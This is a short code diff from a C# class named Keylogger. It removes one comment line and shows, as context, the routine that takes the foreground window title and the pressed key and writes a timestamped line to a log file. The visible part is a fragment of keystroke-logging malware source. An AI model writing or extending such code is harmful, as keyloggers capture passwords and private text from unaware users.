@@ -70,7 +70,6 @@ public class Keylogger
                 windowTitle = buff.ToString();
 
             string keyName = ((System.Windows.Forms.Keys)vkCode).ToString();
-            // Use string.Format for compatibility
             string line = string.Format("[{0:HH:mm:ss}][{1}] {2}", DateTime.Now, windowTitle, keyName);
             _writer.WriteLine(line);
         }
